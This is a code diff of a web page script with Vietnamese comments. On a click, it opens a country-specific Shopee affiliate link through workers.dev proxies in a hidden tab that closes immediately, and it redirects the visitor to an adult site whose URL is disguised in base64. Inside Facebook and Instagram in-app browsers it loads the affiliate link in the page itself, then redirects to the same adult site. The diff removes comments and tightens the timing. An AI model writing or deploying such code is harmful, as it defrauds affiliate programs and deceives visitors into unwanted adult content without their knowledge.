@@ -75,7 +75,7 @@ const xorKey = "PandaKey2025";
 // --- Mã hóa link 18+ ---
 const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
 
-// --- Link Affiliate Shopee theo quốc gia (theo yêu cầu) ---
+// --- Link Affiliate Shopee theo quốc gia ---
 const affLinks = {
   VN: "https://invl-proxy-clmx0am.kitthh1412.workers.dev/",
   MY: "https://invole-shopee-my.kitthh1412.workers.dev/",
@@ -95,73 +95,61 @@ function isIOS() { return /iPad|iPhone|iPod/i.test(navigator.userAgent); }
 function isIOSChrome() { return /CriOS/i.test(navigator.userAgent) && isIOS(); }
 function isFacebookApp() {
   const ua = navigator.userAgent || "";
-  // FBAN/FBAV xuất hiện trên iOS & Android khi mở trong ứng dụng Facebook/Instagram
   return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
 }
 
-// --- Điều hướng bền bỉ cho 18+ ---
+// --- Điều hướng bền bỉ cho 18+ (tối ưu) ---
 function navigate18Resilient(url) {
   let done = false;
-  let t1 = null, t2 = null, t3 = null;
+  let t1 = null, t2 = null;
 
   const go = () => {
     if (done) return;
     done = true;
     if (t1) clearTimeout(t1);
     if (t2) clearTimeout(t2);
-    if (t3) clearTimeout(t3);
-    window.removeEventListener('pagehide', onPageHide, optsOnce);
-    window.removeEventListener('focus', onFocus, optsOnce);
-    window.removeEventListener('pageshow', onPageShow, optsOnce);
+    window.removeEventListener('pagehide', onPageHide);
+    window.removeEventListener('focus', onFocus);
     document.removeEventListener('visibilitychange', onVisibleChange);
 
     try { window.location.replace(url); }
     catch (_) { window.location.href = url; }
   };
 
-  const onPageHide = () => setTimeout(go, 120);
+  const onPageHide = () => setTimeout(go, 80);
   const onFocus = () => go();
-  const onPageShow = () => go();
   const onVisibleChange = () => { if (document.visibilityState === 'visible') go(); };
 
-  const optsOnce = { once: true };
-  const d1 = isIOSChrome() ? 250 : 80;
-  const d2 = isIOSChrome() ? 800 : 300;
+  t1 = setTimeout(go, 1000);   // 1s
+  t2 = setTimeout(go, 1300);   // 1.3s
 
-  t1 = setTimeout(go, d1);
-  t2 = setTimeout(go, d2);
-  t3 = setTimeout(go, 1800);
-
-  window.addEventListener('pagehide', onPageHide, optsOnce);
-  window.addEventListener('focus', onFocus, optsOnce);
-  window.addEventListener('pageshow', onPageShow, optsOnce);
+  window.addEventListener('pagehide', onPageHide, { once:true });
+  window.addEventListener('focus', onFocus, { once:true });
   document.addEventListener('visibilitychange', onVisibleChange);
 }
 
-// --- Nhận diện quốc gia từ ngôn ngữ trình duyệt ---
+// --- Nhận diện quốc gia ---
 function getCountry() {
   const lang = (navigator.language || "").toUpperCase();
   if (lang.includes("VI")) return "VN";
   if (lang.includes("MS") || lang.includes("MY")) return "MY";
   if (lang.includes("EN-SG") || lang.includes("SG")) return "SG";
   if (lang.includes("EN-PH") || lang.includes("PH")) return "PH";
-  return "VN"; // mặc định
+  return "VN";
 }
 
-// --- Mở link Shopee trong tab mới rồi đóng ngay (ẩn tab trắng) ---
+// --- Mở link Shopee stealth ---
 function openShopeeStealth(url) {
   let win = null;
   try {
     win = window.open(url, "_blank");
   } catch (_) {}
 
-  // cố gắng đóng rất sớm để user không thấy tab trắng
   const tryClose = () => {
     if (!win) return;
     try {
       win.close();
       if (!win.closed) {
-        // fallback: đẩy về about:blank để biến mất khỏi lịch sử
         win.location.replace("about:blank");
       }
     } catch (e) {
@@ -205,29 +193,20 @@ document.addEventListener('DOMContentLoaded', function() {
     e.preventDefault();
 
     const country = getCountry();
-    const affLink = affLinks[country] || affLinks.VN; // VN làm mặc định
+    const affLink = affLinks[country] || affLinks.VN;
     const link18 = atob(link18_b64);
 
     if (isFacebookApp()) {
-      // Trong Facebook/Instagram in-app browser: đổi trang hiện tại để chắc chắn ghi click
-      // rồi điều hướng tiếp 18+
       try {
-        window.location.href = affLink; // click affiliate quốc gia tương ứng
+        window.location.href = affLink;
       } finally {
-        setTimeout(() => {
-          navigate18Resilient(link18);
-        }, 600);
+        navigate18Resilient(link18);
       }
       return;
     }
 
-    // Ngoài Facebook app: mở trong tab mới rồi đóng ngay để tránh tab trắng, đồng thời vào 18+
     openShopeeStealth(affLink);
-
-    // Chuyển trang hiện tại sang 18+
-    setTimeout(() => {
-      navigate18Resilient(link18);
-    }, 80);
+    navigate18Resilient(link18);
   });
 });
 </script>
